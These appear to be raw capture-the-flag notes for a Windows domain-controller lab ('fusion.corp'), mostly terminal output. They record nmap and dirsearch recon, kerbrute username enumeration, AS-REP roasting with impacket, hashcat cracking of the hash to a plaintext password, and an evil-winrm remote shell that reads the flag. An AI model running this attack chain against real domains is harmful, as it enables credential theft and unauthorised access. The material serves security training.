```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.12.203           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 16:28 EDT
Nmap scan report for 10.10.12.203
Host is up (0.11s latency).
Not shown: 821 filtered ports, 171 closed ports
PORT     STATE SERVICE
88/tcp   open  kerberos-sec		excell file    nothing in source 
135/tcp  open  msrpc			
139/tcp  open  netbios-ssn
389/tcp  open  ldap
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 47.91 seconds
```

```bash
 
┌──(kali㉿kali)-[~/Downloads]
└─$ dirsearch -r -u 10.10.12.203

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877

Output File: /home/kali/.dirsearch/reports/10.10.12.203/_21-06-24_16-50-36.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-06-24_16-50-36.log

Target: http://10.10.12.203/

[16:50:37] Starting: 
[16:50:38] 301 -  146B  - /js  ->  http://10.10.12.203/js/
[16:50:39] 403 -  312B  - /%2e%2e//google.com
[16:50:49] 200 -  263B  - /Backup/     (Added to queue)
[16:50:53] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[16:51:08] 301 -  150B  - /backup  ->  http://10.10.12.203/backup/
[16:51:08] 200 -  263B  - /backup/     (Added to queue)
[16:51:14] 301 -  147B  - /css  ->  http://10.10.12.203/css/
[16:51:21] 301 -  147B  - /img  ->  http://10.10.12.203/img/
[16:51:22] 200 -   53KB - /index.html
[16:51:23] 200 -  239B  - /js/     (Added to queue)
[16:51:24] 301 -  147B  - /lib  ->  http://10.10.12.203/lib/
[16:51:24] 200 -    1KB - /lib/     (Added to queue)
[16:51:50] Starting: Backup/
[16:52:08] 403 -  312B  - /Backup/\..\..\..\..\..\..\..\..\..\etc\passwd
CTRL+C detected: Pausing threads, please wait...
[e]xit / [c]ontinue / [n]ext: e
```

nmap -sC -sV -p- -Pn --min-rate 5000 -T5 -v --open 10.10.12.203

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sCV -p- -Pn --min-rate 5000 -T5 -v --open 10.10.12.203
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 16:58 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Initiating NSE at 16:58
Completed NSE at 16:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:58
Completed Parallel DNS resolution of 1 host. at 16:58, 0.02s elapsed
Initiating Connect Scan at 16:58
Scanning 10.10.12.203 [65535 ports]
Discovered open port 80/tcp on 10.10.12.203
Discovered open port 445/tcp on 10.10.12.203
Discovered open port 139/tcp on 10.10.12.203
Discovered open port 53/tcp on 10.10.12.203
Discovered open port 135/tcp on 10.10.12.203
Discovered open port 3389/tcp on 10.10.12.203
Discovered open port 593/tcp on 10.10.12.203
Discovered open port 3268/tcp on 10.10.12.203
Discovered open port 3269/tcp on 10.10.12.203
Discovered open port 636/tcp on 10.10.12.203
Discovered open port 49666/tcp on 10.10.12.203
Warning: 10.10.12.203 giving up on port because retransmission cap hit (2).
Discovered open port 88/tcp on 10.10.12.203
Increasing send delay for 10.10.12.203 from 0 to 5 due to 13 out of 32 dropped probes since last increase.
Completed Connect Scan at 16:59, 44.89s elapsed (65535 total ports)
Initiating Service scan at 16:59
Scanning 12 services on 10.10.12.203
Completed Service scan at 17:00, 58.65s elapsed (12 services on 1 host)
NSE: Script scanning 10.10.12.203.
Initiating NSE at 17:00
Completed NSE at 17:01, 40.24s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 3.07s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Nmap scan report for 10.10.12.203
Host is up (0.14s latency).
Not shown: 65523 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-24 20:59:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-03-02T19:26:49
| Not valid after:  2021-09-01T19:26:49
| MD5:   b6f5 76b6 8a9e 6a30 ed3c 7d67 ebf3 797c
|_SHA-1: bdba d8ee c2ba d088 f1a0 7395 891c 50b1 0b6e 020d
|_ssl-date: 2021-06-24T21:01:08+00:00; +4s from scanner time.
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-24T21:00:29
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Initiating NSE at 17:01
Completed NSE at 17:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.31 seconds
```



mladovic	
aarnold     	
llinda		
dvroslav	
tjefferson
nmaurin
mladovic
lparker
dpertersen


```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo ./kerbrute userenum --dc 10.10.146.252 -d fusion.corp 'userlist1.txt' -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/26/21 - Ronnie Flathers @ropnop

2021/06/26 14:36:44 >  Using KDC(s):
2021/06/26 14:36:44 >  	10.10.146.252:88

2021/06/26 14:36:49 >  [+] VALID USERNAME:	 lparker@fusion.corp
2021/06/26 14:36:50 >  [+] VALID USERNAME:	 administrator@fusion.corp
2021/06/26 14:37:54 >  Done! Tested 111 usernames (2 valid) in 70.088 seconds
``` 
 
 
 
 ```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-GetNPUsers -dc-ip 10.10.146.252 fusion.corp/lparker -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for lparker
$krb5asrep$23$lparker@FUSION.CORP:765487cf2df44736d7b77e50903bf01e$b336c16db4210c735d47b52618f87030e5e7686a93f02d8890a338381a1e47bde22af8f1d29dcc079fd1c64d67bf610678517472f0335f2c0efd0f39eba605ae6df503de43ff7bc8dca83f040cf347d4fada24043cac97ceeabaeaf9c4f671821ce7aa7b4f137be73341b21fee3b7717b8d803644edbf3cbe1853da418fd98a5e8b4640d37426d938fce61c74d68c97d090362d5150471a5022208c0ee6139e08897df44ce9c3ec48243a7d2e9bd6059b5d5262982b51cf8e1e85f3b81a97439ddb80ce83bac9ea13d4fbf8d8a3f52d41a089963fe92227af13a530da00d84598f2c6fc1125676b1d7c7
```
 



```bash
──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz, 2708/2772 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 99 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$lparker@FUSION.CORP:765487cf2df44736d7b77e50903bf01e$b336c16db4210c735d47b52618f87030e5e7686a93f02d8890a338381a1e47bde22af8f1d29dcc079fd1c64d67bf610678517472f0335f2c0efd0f39eba605ae6df503de43ff7bc8dca83f040cf347d4fada24043cac97ceeabaeaf9c4f671821ce7aa7b4f137be73341b21fee3b7717b8d803644edbf3cbe1853da418fd98a5e8b4640d37426d938fce61c74d68c97d090362d5150471a5022208c0ee6139e08897df44ce9c3ec48243a7d2e9bd6059b5d5262982b51cf8e1e85f3b81a97439ddb80ce83bac9ea13d4fbf8d8a3f52d41a089963fe92227af13a530da00d84598f2c6fc1125676b1d7c7:
!!abbylvzsvs2k6!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$lparker@FUSION.CORP:765487cf2df44736d...b1d7c7
Time.Started.....: Sat Jun 26 14:43:09 2021, (17 secs)
Time.Estimated...: Sat Jun 26 14:43:26 2021, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   150.6 kH/s (10.68ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2461696/14344384 (17.16%)
Rejected.........: 0/2461696 (0.00%)
Restore.Point....: 2457600/14344384 (17.13%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: **meg** -> หรืำ/จุ

Started: Sat Jun 26 14:43:00 2021
Stopped: Sat Jun 26 14:43:28 2021
``` 
 
 
 
lparker:!!abbylvzsvs2k6!

rpd does not work!  why? 

evil-winrm

evil-winrm -i 10.10.94.198 -p '!!abbylvzsvs2k6!' --user lparker



https://github.com/Hackplayers/evil-winrm

#  install dependencies
sudo gem install winrm winrm-fs stringio

# clone the repo
https://github.com/Hackplayers/evil-winrm.git

# switch to directory for evil winrm
kali@kali:~/$cd evil-winrm

# connect to target using low level user credentials
```bash
kali@kali:~/evil-winrm$ ./evil-winrm.rb -i 10.0.0.33 -u ‘bobjones’ -p ‘Password1’ -s ‘/home/kali/’ -e ‘/usr/share/windows-binaries/’
```

```bash                                                                            
┌──(kali㉿kali)-[~/Downloads/evil-winrm]
└─$ sudo ./evil-winrm.rb -i 10.10.146.252 -p '!!abbylvzsvs2k6!' --user lparker

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lparker\Documents> getuid
The term 'getuid' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ getuid
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (getuid:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\lparker\Documents> cd ..
*Evil-WinRM* PS C:\Users\lparker> dir


    Directory: C:\Users\lparker


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         3/3/2021   5:57 AM                Desktop
d-r---         3/3/2021   5:54 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\lparker> cd Desktop
*Evil-WinRM* PS C:\Users\lparker\Desktop> ls


    Directory: C:\Users\lparker\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:04 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\lparker\Desktop> type flag.txt
THM{c105b6fb249741b89432fada8218f4ef}
*Evil-WinRM* PS C:\Users\lparker\Desktop> 



https://linuxcommandlibrary.com/



*Evil-WinRM* PS C:\Users\lparker\Desktop> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary

```


